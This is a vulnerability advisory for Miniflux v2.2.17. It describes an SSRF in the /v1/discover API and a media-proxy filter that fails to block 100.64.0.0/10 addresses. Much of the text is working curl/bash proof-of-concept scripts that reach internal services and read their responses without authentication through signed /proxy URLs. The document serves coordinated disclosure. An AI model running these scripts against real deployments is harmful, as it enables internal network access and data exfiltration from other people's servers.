# Miniflux v2.2.17: /v1/discover SSRF and incomplete 100.64.0.0/10 media-proxy filtering allow internal access and anonymous response exfiltration

## Description

  ### Summary

  Two related issues exist in Miniflux v2.2.17:

  1. The API subscription discovery path (`POST /v1/discover`) performs server-side GET requests to user-supplied URLs without a private-network destination check.
  2. The media proxy attempts to block private/non-public hosts by default (`MEDIA_PROXY_ALLOW_PRIVATE_NETWORKS=0`), but its IP classifier does not treat 100.64.0.0/10 (CGNAT) as non-public.

  In combination, an authenticated low-privileged user can first force Miniflux to interact with internal HTTP services reachable from the Miniflux host, and then exfiltrate internal HTTP response bodies through signed public `/proxy/...` URLs that do not require authentication.

  ### Version information

  - Product: Miniflux
  - Package: miniflux.app/v2
  - Confirmed affected version: v2.2.17
  - Validation date: 2026-03-11
  - Version-specific note: this v2.2.17 tree does not expose `FETCHER_ALLOW_PRIVATE_NETWORKS`; the `/v1/discover` path is missing a fetcher-side private-network check entirely. `MEDIA_PROXY_ALLOW_PRIVATE_NETWORKS` exists and defaults to disabled, but 100.64.0.0/10 is still allowed because of incomplete classification.
  - Related advisory note: This issue appears related to, but distinct from, [GHSA-xwh2-742g-w3wp](https://github.com/miniflux/v2/security/advisories/GHSA-xwh2-742g-w3wp), which was published on January 7, 2026 and patched in 2.2.16. In the tested v2.2.17 tree, loopback/private blocking exists in the media proxy, but `100.64.0.0/10` is still allowed due to incomplete non-public IP classification. Additionally, `/v1/discover` remains a separate SSRF request path without a private-network destination check.

  ### Details

  SSRF request path in v2.2.17:

  1. `POST /v1/discover` accepts a user-controlled URL and passes it to the subscription finder:
     `internal/api/api.go:51`
     `internal/api/subscription.go:20`
  2. Validation only checks URL syntax, not destination network class:
     `internal/validator/subscription.go:12`
  3. The fetcher used by this path creates a normal HTTP client and performs `GET` requests, but there is no private-network gate in `ExecuteRequest`:
     `internal/reader/fetcher/request_builder.go:132`
     `internal/reader/fetcher/request_builder.go:199`
  4. `/v1/discover` is not a blind SSRF primitive in the strict sense: it returns discovery results when the target responds with a valid feed, and returns parser/fetch errors otherwise. However, it does not reflect arbitrary response bodies the way `/proxy/...` does.

  Media-proxy bypass and exfiltration path in v2.2.17:

  1. Imported entry content can contain attacker-chosen `<img src="...">` URLs:
     `internal/api/api.go:65`
     `internal/api/entry.go:366`
  2. API responses rewrite entry content to signed absolute `/proxy/{digest}/{encodedURL}` links:
     `internal/api/entry.go:39`
     `internal/mediaproxy/url.go:27`
  3. `/proxy` is a public route and does not require login:
     `internal/ui/ui.go:107`
     `internal/ui/middleware.go:158`
  4. The media proxy tries to block private hosts by default:
     `internal/config/options.go:356`
     `internal/config/options_parsing_test.go:1445`
  5. However, the hostname check uses `isNonPublicIP`, which only relies on `IsPrivate`, `IsLoopback`, `IsLinkLocal*`, `IsMulticast`, and `IsUnspecified`. This misses 100.64.0.0/10:
     `internal/ui/proxy.go:86`
     `internal/urllib/url.go:158`
     `internal/urllib/url.go:174`

  Impact of the combination:

  1. Any authenticated user who can call the API can make Miniflux send HTTP GET requests to attacker-chosen internal HTTP endpoints.
  2. If the target is placed in 100.64.0.0/10, the signed public media proxy can return the internal response body to an unauthenticated client.
  3. This enables internal service access, endpoint discovery, and response exfiltration from the Miniflux network context.

  ### PoC

  Environment:

  1. Use Miniflux v2.2.17.
  2. Keep the default `MEDIA_PROXY_ALLOW_PRIVATE_NETWORKS=0`.
  3. Ensure Miniflux can reach an HTTP service in `100.64.0.0/10`. A Docker network or a loopback/dummy interface is sufficient; no physical host is required.
  4. Default `MEDIA_PROXY_MODE=http-only` is sufficient as long as the injected media URL uses `http://`.

  #### PoC A: direct SSRF through /v1/discover (v2.2.17-specific behavior)

  Example target:

  - internal feed URL: `http://100.64.0.1:18080/feed.xml`

  ```bash
  MF='http://127.0.0.1:8080'
  AUTH='admin:test123'
  DISCOVER='http://100.64.0.1:18080/feed.xml'

  curl -s -u "$AUTH" \
    -H 'Content-Type: application/json' \
    -d "{\"url\":\"$DISCOVER\"}" \
    "$MF/v1/discover"
  ```

  Expected / observed:

  1. Miniflux performs a server-side GET to the user-supplied URL.
  2. If the `100.64.0.0/10` target responds with a valid feed, Miniflux returns it as a discovered subscription.

  Example response:

  ```json
  [{"title":"http://100.64.0.1:18080/feed.xml","url":"http://100.64.0.1:18080/feed.xml","type":"rss"}]
  ```

  This demonstrates that in v2.2.17 the discovery path itself is an unrestricted, result-bearing SSRF primitive; it does not rely on `FETCHER_ALLOW_PRIVATE_NETWORKS` because that option is not present in this version. It provides success/error feedback and discovered feed metadata, but not arbitrary raw response-body reflection.

  #### PoC B: end-to-end anonymous exfiltration through the public media proxy

  Prerequisite:

  - any authenticated user account (Basic auth or API token is sufficient)

  Example target:

  - internal secret URL: `http://100.64.0.1:18080/secret`

  ```bash
  MF='http://127.0.0.1:8080'
  AUTH='admin:test123'
  DISCOVER='http://100.64.0.1:18080/feed.xml'
  TARGET='http://100.64.0.1:18080/secret'

  CATEGORY_ID=$(curl -s -u "$AUTH" "$MF/v1/categories" | jq '.[0].id')

  FEED_ID=$(curl -s -u "$AUTH" \
    -H 'Content-Type: application/json' \
    -d "{\"feed_url\":\"$DISCOVER\",\"category_id\":$CATEGORY_ID}" \
    "$MF/v1/feeds" | jq '.feed_id')

  EID=$(curl -s -u "$AUTH" \
    -H 'Content-Type: application/json' \
    -d "{\"url\":\"https://attacker.example/poc\",\"title\":\"poc\",\"content\":\"<img src=\\\"$TARGET\\\">\"}" \
    "$MF/v1/feeds/$FEED_ID/entries/import" | jq '.id')

  CONTENT=$(curl -s -u "$AUTH" "$MF/v1/entries/$EID" | jq -r '.content')
  PROXY_URL=$(echo "$CONTENT" | grep -oE 'https?://[^"]+/proxy/[^"]+' | head -n1)

  echo "$PROXY_URL"
  curl -i "$PROXY_URL"
  ```

  Expected / observed:

  1. The API response contains a signed absolute `/proxy/...` URL for the attacker-controlled `img src`.
  2. The `/proxy/...` URL is accessible without authentication.
  3. A GET to that URL returns the HTTP status and body from the internal `100.64.0.0/10` target.

  Example result:

  ```http
  HTTP/1.1 200 OK
  ...

  topsecret-from-100.64.0.1
  ```

  #### Control check: loopback is blocked while 100.64.0.0/10 is allowed

  Reuse `FEED_ID` from PoC B:

  ```bash
  MF='http://127.0.0.1:8080'
  AUTH='admin:test123'

  EID=$(curl -s -u "$AUTH" \
    -H 'Content-Type: application/json' \
    -d '{"url":"https://attacker.example/loopback","title":"loopback","content":"<img src=\"http://127.0.0.1:8080/healthcheck\">"}' \
    "$MF/v1/feeds/$FEED_ID/entries/import" | jq '.id')

  CONTENT=$(curl -s -u "$AUTH" "$MF/v1/entries/$EID" | jq -r '.content')
  PROXY_URL=$(echo "$CONTENT" | grep -oE 'https?://[^"]+/proxy/[^"]+' | head -n1)
  curl -i "$PROXY_URL"
  ```

  Expected / observed:

  1. A loopback target is rejected with `403 Forbidden`.
  2. A `100.64.0.0/10` target succeeds with `200 OK` and returns the internal body.

  This demonstrates that the proxy is not simply "open to everything"; the failure is specific to incomplete non-public IP classification.

  ### Impact

  Type:

  1. SSRF (CWE-918) through a user-controlled outbound request path in v2.2.17.
  2. Response exfiltration through a signed public media proxy URL.
  3. Internal service access, reconnaissance, and selective response disclosure from the Miniflux host/network context.

  Who is impacted:

  1. Miniflux v2.2.17 deployments where authenticated users can call API endpoints such as `/v1/discover` or import entries.
  2. Multi-user or shared deployments where low-privileged users can interact with URL-fetch features.
  3. Environments with sensitive HTTP services reachable from the Miniflux host, especially in special-use ranges such as 100.64.0.0/10.

  ---

  Affected products

  - Ecosystem: Go
  - Package name: miniflux.app/v2
  - Confirmed affected version: 2.2.17
  - Other versions: not revalidated in this revised report
  - Patched versions: not patched in the tested 2.2.17 source tree as of 2026-03-11

  ---

  Severity

  - Vector string: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:L

  ---

  Weaknesses (CWE)

  - CWE-918: Server-Side Request Forgery (SSRF)
